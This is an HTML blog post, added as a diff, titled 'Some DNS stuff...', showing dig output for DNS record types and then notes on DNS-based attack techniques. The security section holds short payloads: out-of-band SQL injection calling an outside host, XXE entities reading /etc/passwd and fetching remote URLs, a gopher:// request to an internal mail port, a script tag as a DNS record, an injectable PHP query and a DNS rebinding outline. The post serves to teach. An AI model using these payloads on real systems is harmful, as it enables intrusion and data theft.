@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Some DNS stuff...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="Mia Steinkirch">
+
+    <!-- Le styles -->
+    <link rel="stylesheet" href="./theme/css/bootstrap.dark.css" type="text/css" />
+    <style type="text/css">
+      body {
+        padding-top: 60px;
+        padding-bottom: 40px;
+      }
+      .tag-1 {
+        font-size: 13pt;
+      }
+      .tag-2 {
+        font-size: 11pt;
+      }
+      .tag-2 {
+        font-size: 10pt;
+      }
+      .tag-4 {
+        font-size: 8pt;
+     }
+     }
+    </style>
+    <link href="./theme/css/bootstrap-responsive.dark.css" rel="stylesheet">
+    <link href="./theme/css/font-awesome.css" rel="stylesheet">
+    <link href="./theme/css/pygments.css" rel="stylesheet">
+
+
+    <!-- Le fav and touch icons -->
+    <link rel="shortcut icon" href="./theme/images/favicon.ico">
+    <link rel="apple-touch-icon" href="./theme/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="./theme/images/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="./theme/images/apple-touch-icon-114x114.png">
+
+    <link href="./feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="chmod +x singularity.sh ATOM Feed" />
+
+  </head>
+
+  <body>
+
+    <div class="navbar navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container-fluid">
+          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </a>
+          <a class="brand" href="./index.html">chmod +x singularity.sh </a>
+          <div class="nav-collapse">
+            <ul class="nav">
+                          <li class="divider-vertical"></li>
+
+                          <ul class="nav pull-right">
+                                <li><a href="./authors.html">Who is this Replicant</a></li>
+                                <li><a href="./archives.html">Old Musing</a></li>
+                                <li>
+                                      <a href="https://github.com/bt3gl">The Language Within
+                                      <!--<i class="icon-github-sign icon-large" ></i>-->
+                                      </a></li>
+                                <li><a href="http://bt3gl.github.io/projects_page/index.html">Bygone Playful Times
+                                      </a></li>
+                                <li><a href="http://www.astro.sunysb.edu/steinkirch/index.html">Universe and Everything Else
+                                     </a></li>
+                          
+                          
+                          </ul>
+
+            </ul>
+            <!--<p class="navbar-text pull-right">Logged in as <a href="#">username</a></p>-->
+          </div><!--/.nav-collapse -->
+        </div>
+      </div>
+    </div>
+
+    <div class="container-fluid">
+      <div class="row">
+        <div class="span9" id="content">
+<section id="content">
+        <article>
+                <header>
+                        <h1>
+                                <a href=""
+                                        rel="bookmark"
+                                        title="Permalink to Some DNS stuff...">
+                                        Some DNS stuff...
+                                </a>
+                        </h1>
+                </header>
+                <div class="entry-content">
+                <div class="well">
+<footer class="post-info">
+<abbr class="published" title="2016-02-12T06:00:00">
+      Fri 12 February 2016 </abbr>
+
+<span class="label"> Category</span>
+<a href="./category/interwebz.html"><i class="icon-folder-open"></i>interwebz</a>
+
+
+<span class="label">Tags</span>
+	<a href="./tag/h4x0r.html"><i class="icon-tag"></i>h4x0r</a>
+	<a href="./tag/dns.html"><i class="icon-tag"></i>dns</a>
+</footer><!-- /.post-info -->                </div>
+                <p><img alt="cyberpunk" height="270px" src="./cyberpunk/w3.jpg" width="390px" /></p>
+<h2>DNS Recursive requests</h2>
+<p>Where did my packet go?</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="nb">nslookup</span> <span class="na">-q</span><span class="o">=</span><span class="nx">mx</span> <span class="o">&lt;</span><span class="nx">website</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<p>???????</p>
+<div class="highlight"><pre><span class="mf">192.168.0.1</span> <span class="o">=&gt;</span> <span class="mf">8.8.8.8</span> <span class="o">=&gt;</span> <span class="n">X</span><span class="p">.</span><span class="n">root</span><span class="o">-</span><span class="n">servers</span><span class="p">.</span><span class="n">net</span> <span class="o">=&gt;</span>  <span class="n">Authoritative</span> <span class="n">server</span> <span class="o">==&gt;</span> <span class="o">?</span>
+</pre></div>
+
+
+<p>There are lots of different record types:</p>
+<h3>A: Get an IP address</h3>
+<div class="highlight"><pre><span class="nv">$ </span>dig @8.8.8.8 -t A www.google.com
+; <span class="o">(</span>1 server found<span class="o">)</span>
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: 140
+;; flags: qr rd ra; QUERY: 1, ANSWER: 16, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;www.google.com.            IN  A
+
+;; ANSWER SECTION:
+www.google.com.     151 IN  A   167.206.12.84
+....
+
+;; Query <span class="nb">time</span>: 46 msec
+;; SERVER: 8.8.8.8#53<span class="o">(</span>8.8.8.8<span class="o">)</span>
+;; WHEN: Mon Sep 29 13:55:31 EDT 2014
+;; MSG SIZE  rcvd: 299
+</pre></div>
+
+
+<h3>AAAA: Get an IPv6 address</h3>
+<div class="highlight"><pre><span class="nv">$ </span>dig @8.8.8.8 -t AAAA www.google.com
+; <span class="o">(</span>1 server found<span class="o">)</span>
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: 21322
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;www.google.com.            IN  AAAA
+
+;; ANSWER SECTION:
+www.google.com.     299 IN  AAAA    2607:f8b0:4006:80a::1011
+
+;; Query <span class="nb">time</span>: 31 msec
+;; SERVER: 8.8.8.8#53<span class="o">(</span>8.8.8.8<span class="o">)</span>
+;; WHEN: Mon Sep 29 13:55:44 EDT 2014
+;; MSG SIZE  rcvd: 71
+</pre></div>
+
+
+<h3>MX: Mail server</h3>
+<div class="highlight"><pre><span class="nv">$ </span>dig @8.8.8.8 -t MX www.google.com
+; &lt;&lt;&gt;&gt; DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 &lt;&lt;&gt;&gt; @8.8.8.8 -t MX www.google.com
+; <span class="o">(</span>1 server found<span class="o">)</span>
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: 63724
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;www.google.com.            IN  MX
+
+;; AUTHORITY SECTION:
+google.com.     41  IN  SOA ns1.google.com. dns-admin.google.com. 1568903 7200 1800 1209600 300
+
+;; Query <span class="nb">time</span>: 29 msec
+;; SERVER: 8.8.8.8#53<span class="o">(</span>8.8.8.8<span class="o">)</span>
+;; WHEN: Mon Sep 29 13:57:48 EDT 2014
+;; MSG SIZE  rcvd: 93
+</pre></div>
+
+
+<h3>CNAME</h3>
+<div class="highlight"><pre><span class="nv">$ </span>dig @8.8.8.8 -t CNAME www.google.com
+
+; &lt;&lt;&gt;&gt; DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 &lt;&lt;&gt;&gt; @8.8.8.8 -t CNAME www.google.com
+; <span class="o">(</span>1 server found<span class="o">)</span>
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: 9080
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;www.google.com.            IN  CNAME
+
+;; AUTHORITY SECTION:
+google.com.     59  IN  SOA ns1.google.com. dns-admin.google.com. 1568903 7200 1800 1209600 300
+
+;; Query <span class="nb">time</span>: 30 msec
+;; SERVER: 8.8.8.8#53<span class="o">(</span>8.8.8.8<span class="o">)</span>
+;; WHEN: Mon Sep 29 13:58:23 EDT 2014
+;; MSG SIZE  rcvd: 93
+</pre></div>
+
+
+<h3>TXT: Text Data</h3>
+<p>Any sort of binary.</p>
+<div class="highlight"><pre>dig @8.8.8.8 -t TXT www.google.com
+
+; &lt;&lt;&gt;&gt; DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 &lt;&lt;&gt;&gt; @8.8.8.8 -t TXT www.google.com
+; <span class="o">(</span>1 server found<span class="o">)</span>
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: 39345
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;www.google.com.            IN  TXT
+
+;; AUTHORITY SECTION:
+google.com.     59  IN  SOA ns1.google.com. dns-admin.google.com. 1568903 7200 1800 1209600 300
+
+;; Query <span class="nb">time</span>: 29 msec
+;; SERVER: 8.8.8.8#53<span class="o">(</span>8.8.8.8<span class="o">)</span>
+;; WHEN: Mon Sep 29 13:59:01 EDT 2014
+;; MSG SIZE  rcvd: 93
+</pre></div>
+
+
+<h3>Packet Structure</h3>
+<p>Header:</p>
+<div class="highlight"><pre><span class="nv">$ </span>dig @8.8.8.8 -t A www.google.com
+; &lt;&lt;&gt;&gt; DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 &lt;&lt;&gt;&gt; @8.8.8.8 -t A www.google.com
+; <span class="o">(</span>1 server found<span class="o">)</span>
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: 25803
+;; flags: qr rd ra; QUERY: 1, ANSWER: 16, AUTHORITY: 0, ADDITIONAL: 1
+</pre></div>
+
+
+<p>Where:</p>
+<ul>
+<li>ID</li>
+<li>Opcode</li>
+<li>flags: qr rd ra</li>
+<li>status: RCODE</li>
+<li>QUERY</li>
+<li>ANSWER</li>
+<li>AUTHORITY</li>
+<li>ADDTIONAL</li>
+<li></li>
+</ul>
+<p>A query for ANY works because the TYPE of record is returned:</p>
+<div class="highlight"><pre><span class="nv">$ </span> dig @8.8.8.8 -t ANY google.com
+
+; &lt;&lt;&gt;&gt; DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 &lt;&lt;&gt;&gt; @8.8.8.8 -t ANY google.com
+; <span class="o">(</span>1 server found<span class="o">)</span>
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: 64648
+;; flags: qr rd ra; QUERY: 1, ANSWER: 28, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;google.com.            IN  ANY
+
+;; ANSWER SECTION:
+google.com.     299 IN  A   167.206.10.221
+...
+google.com.     21599   IN  SOA ns1.google.com. dns-admin.google.com. 2014021800 7200 1800 1209600 300
+google.com.     3599    IN  TXT <span class="s2">&quot;v=spf1 include:_spf.google.com ip4:216.73.93.70/31 ip4:216.73.93.72/31 ~all&quot;</span>
+google.com.     599 IN  MX  40 alt3.aspmx.l.google.com.
+...
+
+;; Query <span class="nb">time</span>: 30 msec
+;; SERVER: 8.8.8.8#53<span class="o">(</span>8.8.8.8<span class="o">)</span>
+;; WHEN: Mon Sep 29 15:14:48 EDT 2014
+;; MSG SIZE  rcvd: 640
+</pre></div>
+
+
+<hr />
+<h2>Reverse DNS</h2>
+<p>Works identically, but has a record of type of PTR (and special way of formatting the IP address backwards).</p>
+<p>How frequently is it trusted?</p>
+<hr />
+<h2>Security</h2>
+<h3>Recon with DNS</h3>
+<p>DNS is allowed off every network. Most traffic gets blocked by firewalls, but not the internet. DNS traffic foes through the router.</p>
+<p>All requests to *.somesite.com go to its DNS sever.</p>
+<h3>Cross-site Scripting in Logs</h3>
+<p>Cross-site scripting occurs when HTML runs in somebody else's browser.</p>
+<p>For example, you can set the user-agent to <img src="http://somesite.com/img.jpg"> and then watch the DNS server.</p>
+<ol>
+<li>HTTP Request is sent to a vulnerable server.</li>
+<li>HTML is returned.</li>
+<li>DNS request is sent.</li>
+<li>NXDOMAIN = "host not found"</li>
+</ol>
+<p>So:</p>
+<ol>
+<li>A packet capture will look completely innocent.</li>
+<li>We aren't directly connecting off the network so firewalls will never know.</li>
+</ol>
+<p>We can tell when a service wants to make a connection, without the connection succeeding, and without the service even attempting to make the connection.</p>
+<h3>SQL Injection</h3>
+<p>Two SQL queries that should cause a DNS lookup:</p>
+<div class="highlight"><pre><span class="n">EXEC</span> <span class="n">sp_addlinkedserver</span> <span class="err">&#39;</span><span class="n">somsite</span><span class="p">.</span><span class="n">com</span><span class="err">&#39;</span><span class="p">.</span> <span class="n">N</span><span class="sc">&#39;A&#39;</span><span class="p">;</span>
+</pre></div>
+
+
+<p>and</p>
+<div class="highlight"><pre><span class="n">SELECT</span> <span class="mi">1</span> <span class="n">INTO</span> <span class="n">OUTFILE</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">cba.skullseclabs.org\C$&quot;</span><span class="p">;</span>
+</pre></div>
+
+
+<p>Results: data theft, shell access, arbitrary read.</p>
+<h3>XXE</h3>
+<p>XXE: returns to XML external entity attacks</p>
+<p>XXE lets you include files from filesystem</p>
+<div class="highlight"><pre><span class="cp">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>]&gt;
+<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span>&gt;<span class="nt">&lt;/foo&gt;</span>
+</pre></div>
+
+
+<p>And also files from remote servers:</p>
+<div class="highlight"><pre><span class="cp">&lt;!ENTITY xxe SYSTEM &quot;http://www.google.ca&quot;&gt;</span>]&gt;
+<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xee;</span><span class="nt">&lt;/foo&gt;</span>
+</pre></div>
+
+
+<h3>Finding XXE</h3>
+<p>Grab a resource from a domain:</p>
+<div class="highlight"><pre><span class="cp">&lt;!ENTITY xxe SYSTEM &quot;http://aab.skullseclabs.org&quot;&gt;</span>]&gt;
+
+<span class="nt">&lt;foo&gt;</span> <span class="ni">&amp;xxe;</span> <span class="nt">&lt;/foo&gt;</span>
+</pre></div>
+
+
+<p>Even if there is a firewall, and a weird filesystem, and the file isn't send back to the user, you can still detect XXE!</p>
+<h3>Gopher</h3>
+<p>If you ask a server to do a request for:</p>
+<div class="highlight"><pre><span class="nl">gopher:</span><span class="c1">//internal-ip:25/AHELO%0AMAIL+FROM...</span>
+</pre></div>
+
+
+<p>Meaning that, if you can get a service to fetch an arbitrary gopher://URL, such as through XXE, you can attack back-end services.</p>
+<p>Having to use DNS to exploit this is unlikely.</p>
+<h2>PHP bad fopen()</h2>
+<p>Very similar to XXE.</p>
+<p>Old versions of PHP allowed Internet links (http://...) in fopen()</p>
+<p>Arbitrary file read, gopher:// issues again.</p>
+<h3>Shell injection</h3>
+<p>Simply inject a DNS lookup into every field</p>
+<p>Full server access</p>
+<h3>DNS Lookups</h3>
+<p>Untrusted.</p>
+<p>Exploit:</p>
+<p>Setting TXT record will change email field to a list of databases:</p>
+<div class="highlight"><pre><span class="err">$</span><span class="n">addr</span> <span class="o">=</span> <span class="n">gethostbyaddr</span><span class="p">(</span><span class="err">$</span><span class="n">_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]))</span>
+<span class="err">$</span><span class="n">details</span> <span class="o">=</span> <span class="n">print_r</span><span class="p">(</span><span class="n">dns_get_record</span><span class="p">(</span><span class="err">$</span><span class="n">addr</span><span class="p">),</span> <span class="k">true</span><span class="p">);</span>
+<span class="n">mysql_query</span><span class="p">(</span><span class="ss">&quot;UPDATE users SET password=&#39;$details&#39; WHERE username=&quot;</span><span class="err">$</span><span class="n">username</span><span class="err">&#39;&quot;</span><span class="p">);</span>
+</pre></div>
+
+
+<h3>Cross-site scripting</h3>
+<p>The following is a valid CNAME, MX, TXT, PTR:</p>
+<div class="highlight"><pre><span class="nt">&lt;script</span><span class="err">/</span><span class="na">src=</span><span class="s">&quot;http://javaop.com/test-js.js&#39;</span><span class="nt">&gt;&lt;/script&gt;</span>
+</pre></div>
+
+
+<h3>DNS Re-binding</h3>
+<p>First we look at how you can smuggle untrusted data to a protected server.
+Then how to smuggle data off a protected server to the attack.</p>
+<ol>
+<li>
+<p>The user ends up a the page evil. They look it up via DNS.</p>
+</li>
+<li>
+<p>The user is sent to an evil server.</p>
+</li>
+<li>
+<p>While there, a session is created (authentication, cookies, etc)</p>
+</li>
+<li>
+<p>The session refreshes, with another DNS lookup</p>
+</li>
+<li>
+<p>This time the evil DNS server sends them to a trusted service. The browser does not realize the server has changed.</p>
+</li>
+<li>
+<p>The session eventually refreshes, triggering another DNS lookup</p>
+</li>
+<li>
+<p>Any cookies/local storage/etc can be accessed. The browser thinks its the same origin.</p>
+</li>
+</ol>
+<p>This show two attacks:</p>
+<ol>
+<li>Using re-binding to sneak data into a trusted context by switching from an evil IP to a trusted one.</li>
+<li>Using re-binding to sneak data out of a trusted context by switching from a trusted IP to an evil one.</li>
+</ol>
+<p>Advice:</p>
+<ul>
+<li>Look at you DNS traffic, keep an eye for anomalies</li>
+<li>A spike in traffic can mean a dns backdoor or some malware.. ☠️</li>
+</ul>
+<hr />
+<p><strong>aloha, mia</strong>*</p>
+                </div><!-- /.entry-content -->
+        </article>
+</section>
+        </div><!--/span-->
+
+
+      </div><!--/row-->
+
+
+
+      <footer>
+        <address id="about">
+
+        </address><!-- /#about -->
+
+      </footer>
+
+    </div><!--/.fluid-container-->
+
+
+    <script src="./theme/js/jquery-1.7.2.min.js"></script>
+    <script src="./theme/js/bootstrap.min.js"></script>
+  </body>
+</html>
